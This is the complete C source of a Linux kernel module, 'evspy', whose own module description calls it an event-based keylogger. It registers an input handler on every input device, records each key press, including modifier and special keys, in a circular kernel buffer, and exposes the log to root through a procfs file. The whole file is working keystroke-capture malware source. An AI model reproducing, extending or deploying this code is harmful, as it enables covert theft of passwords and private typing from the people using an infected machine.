/*
 *   Copyright (c) 2011 Guillermo Ramos <0xwille@gmail.com>
 *   based on evbug module by Vojtech Pavlik ((c) 1999-2001)
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
 *
 * Should you need to contact me, the author, you can mail your message to
 * <0xwille@gmail.com>
 */

#include "evspy-core.h"


static char *buffer;		// circular buffer
static char *rdp;			// read pointer
static char *wrp;			// write pointer
static unsigned short int capslock_state = EVS_VAL_FREE;
static unsigned short int shift = 0;

/*
 * Executed when the procfs file is read (EVS_PROCNAME)
 */
static int evspy_read_proc(char *page, char **start, off_t offset, int count,
		int *eof, void *data)
{
	int n, toend;
	int retval = 0;
	int diff = wrp - rdp;

	// root only plz
	if (current_uid() || current_euid()) {
#if EVS_TROLL == 1
		n = MIN(36, count);
		strncpy(page, "Trololololo lololo lololo\nhohohoho\n", n);
		*eof = 1;
		return n;
#else
		return -EPERM;
#endif
	}

	// wrp > rdp: read from rdp to wrp
	if (diff > 0) {
		n = MIN(diff, count);
		strncpy(page, rdp, n);
		rdp += n;
		retval = n;

	// rdp > wrp: read from rdp to end of buffer and then from the beginning of
	// the buffer to wrp
	} else if (diff < 0) {
		toend = (buffer + EVS_BUFSIZE) - rdp;
		n = MIN(toend, count);
		strncpy(page, rdp, n);
		retval = n;

		if (n < toend) {
			rdp += n;
		} else {
			n = MIN(wrp - buffer, count - retval);
			strncpy(page + retval, buffer, n);
			retval += n;
			rdp = buffer + n;
		}
	}

	// wrp == rdp: buffer is empty
	if (rdp == wrp)
		*eof = 1;
	return retval;
}

/*
 * Handle unknown/special key events
 */
static void special_char(unsigned int code, unsigned int value)
{
	char *sp_tag;
	int known = 1;

	// We need to know when some special keys are freed; add them here
	switch(code) {
	case KEY_LEFTSHIFT:
	case KEY_RIGHTSHIFT:
	case KEY_LEFTALT:
	case KEY_RIGHTALT:
	case KEY_LEFTCTRL:
	case KEY_RIGHTCTRL:
	case KEY_LEFTMETA:
	case KEY_RIGHTMETA:
		break;
	default:
		if (value == EVS_VAL_FREE)
			return;
	}

	switch(code) {
	case KEY_RIGHTSHIFT:
	case KEY_LEFTSHIFT:
		shift = !shift;
		return;
	case KEY_LEFTALT:
		sp_tag = "[+ALT]";
		break;
	case KEY_RIGHTALT:
		sp_tag = "[+ALTGR]";
		break;
	case KEY_LEFTCTRL:
	case KEY_RIGHTCTRL:
		sp_tag = "[+CTRL]";
		break;
	case KEY_LEFTMETA:
	case KEY_RIGHTMETA:
		sp_tag = "[+META]";
		break;
	case KEY_TAB:
		sp_tag = "[TAB]";
		break;
	case KEY_ESC:
		sp_tag = "[ESC]";
		break;
	case KEY_UP:
		sp_tag = "[UP]";
		break;
	case KEY_DOWN:
		sp_tag = "[DOWN]";
		break;
	case KEY_LEFT:
		sp_tag = "[LEFT]";
		break;
	case KEY_RIGHT:
		sp_tag = "[RIGHT]";
		break;
	default:
		known = 0;
	}

	if (!known && evs_isfX(code))
		sp_tag = "[+FX]";
	else if (!known)
		return;

	if (value == EVS_VAL_PRESS && (sp_tag[1] == '+' || sp_tag[1] == '-'))
		sp_tag[1] = '+';
	else if (value == EVS_VAL_FREE)
		sp_tag[1] = '-';

	while (*sp_tag)
		evs_insert(*sp_tag++);
}

static void evspy_event(struct input_handle *handle, unsigned int type,
		unsigned int code, int value)
{
	// Ignore hold-key events
	if (unlikely(value == EVS_VAL_HOLD))
		return;

	// If caps lock is pressed, handle it the same way as left shift
	if (code == KEY_CAPSLOCK && value == EVS_VAL_PRESS) {
		special_char(KEY_LEFTSHIFT, capslock_state);
		return;
	} else if (type != EV_KEY) {
		return;
	}

	// Special/unknown keys (alt, ctrl, esc, shift, etc)
	if (unlikely(code >= sizeof(map)) ||
			(map[code] == '.' && likely(code != KEY_DOT))) {
		special_char(code, value);

	// "Direct" keys (alphanumeric + some symbols)
	} else if (value == EVS_VAL_PRESS) {
		if (shift)
			evs_insert(evs_shift(code));
		else
			evs_insert(map[code]);
	}
}

static int evspy_connect(struct input_handler *handler, struct input_dev *dev,
			 const struct input_device_id *id)
{
	struct input_handle *handle;
	int error;

	handle = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
	if (!handle)
		return -ENOMEM;

	handle->dev = dev;
	handle->handler = handler;
	handle->name = EVS_NAME;

	error = input_register_handle(handle);
	if (error)
		goto err_free_handle;

	error = input_open_device(handle);
	if (error)
		goto err_unregister_handle;

	return 0;

 err_unregister_handle:
	input_unregister_handle(handle);
 err_free_handle:
	kfree(handle);
	return error;
}

static void evspy_disconnect(struct input_handle *handle)
{
	input_close_device(handle);
	input_unregister_handle(handle);
	kfree(handle);
}

static const struct input_device_id evspy_ids[] = {
	{ .driver_info = 1 },	/* Matches all devices */
	{ },			/* Terminating zero entry */
};

MODULE_DEVICE_TABLE(input, evspy_ids);

static struct input_handler evspy_handler = {
	.event = evspy_event,
	.connect = evspy_connect,
	.disconnect = evspy_disconnect,
	.name = EVS_NAME,
	.id_table =	evspy_ids,
};

static int __init evspy_init(void)
{
	create_proc_read_entry(EVS_PROCNAME, 0, NULL, evspy_read_proc, NULL);

	init_shiftmap();

	buffer = kmalloc(EVS_BUFSIZE, GFP_KERNEL);
	rdp = wrp = buffer;

	return !buffer || input_register_handler(&evspy_handler);
}

static void __exit evspy_exit(void)
{
	kfree(buffer);
	remove_proc_entry(EVS_PROCNAME, NULL);
	input_unregister_handler(&evspy_handler);
}

module_init(evspy_init);
module_exit(evspy_exit);

MODULE_AUTHOR("Guillermo Ramos <0xwille@gmail.com>");
MODULE_DESCRIPTION("Event based keylogger");
MODULE_LICENSE("GPL");
MODULE_VERSION("0.2");